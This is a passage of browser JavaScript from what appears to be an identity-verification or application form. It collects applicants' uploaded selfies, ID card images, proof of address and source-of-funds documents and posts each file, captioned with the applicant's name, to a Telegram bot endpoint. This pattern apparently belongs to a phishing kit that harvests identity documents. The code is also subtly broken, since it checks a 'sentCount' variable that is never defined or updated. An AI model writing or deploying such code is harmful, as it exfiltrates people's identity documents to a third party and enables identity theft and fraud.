    const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
    fd.append(isImage ? 'photo' : 'document', file, file.name);

    await fetch(`${TG_BASE}/${endpoint}`, { method: 'POST', body: fd });
  } catch(e) { console.error('Telegram file error:', e); }
}

// Gather all uploaded files and send them one by one
async function sendTelegramDocuments() {
  const refId = formData.refId;
  const applicantName = `${formData.firstName||''} ${formData.lastName||''}`.trim();

  // Read from formData (File objects saved on upload, survive DOM re-renders)
  const docSlots = [
    { key: 'file_photo',   label: '📷 <b>Selfie / Profile Photo</b>' },
    { key: 'file_idFront', label: '🪪 <b>ID Front</b>' },
    { key: 'file_idBack',  label: '🪪 <b>ID Back</b>' },
    { key: 'file_poa',     label: '🏠 <b>Proof of Address</b>' },
    { key: 'file_sof',     label: '💵 <b>Source of Funds Proof</b>' },
  ];

  const uploadPromises = [];

for (const slot of docSlots) {
  const file = formData[slot.key];
  if (!(file instanceof File)) continue;

  const caption =
    `${slot.label}\n` +
    `Applicant: ${applicantName}\n` +
    `Ref ID: ${refId}`;

  uploadPromises.push(sendTelegramFile(file, caption));
}

// send all at once (parallel)
await Promise.all(uploadPromises);

  // If no docs were uploaded at all, send a note
  if (sentCount === 0) {
    await sendTelegramMessage(
      `📎 <b>DOCUMENTS</b>\n` +
      `<b>Ref:</b> ${refId}\n` +
      `⚠️ No documents were uploaded by the applicant.`
    );
  }
}

// ─── TOAST ────────────────────────────────────────────────────────────────────
function showToast(msg) {
  let t = document.getElementById('toast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'toast';
    t.style.cssText = 'position:fixed;bottom:2rem;left:50%;transform:translateX(-50%);background:#1a0a0a;border:1px solid rgba(248,113,113,0.4);color:#F87171;padding:.85rem 1.5rem;border-radius:12px;font-weight:700;font-size:.88rem;z-index:9999;backdrop-filter:blur(12px);transition:opacity .3s;white-space:nowrap;';
    document.body.appendChild(t);
  }
  t.textContent = '⚠️  ' + msg;
  t.style.opacity = '1';
  clearTimeout(t._timer);
  t._timer = setTimeout(() => t.style.opacity = '0', 3000);
}

// ─── INIT ─────────────────────────────────────────────────────────────────────
renderStep();
